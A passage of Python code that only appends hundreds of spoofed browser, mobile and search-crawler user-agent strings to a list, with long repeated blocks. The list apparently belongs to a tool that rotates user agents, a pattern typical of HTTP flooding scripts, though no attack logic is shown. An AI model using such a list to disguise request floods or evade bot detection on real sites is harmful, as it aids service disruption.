                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
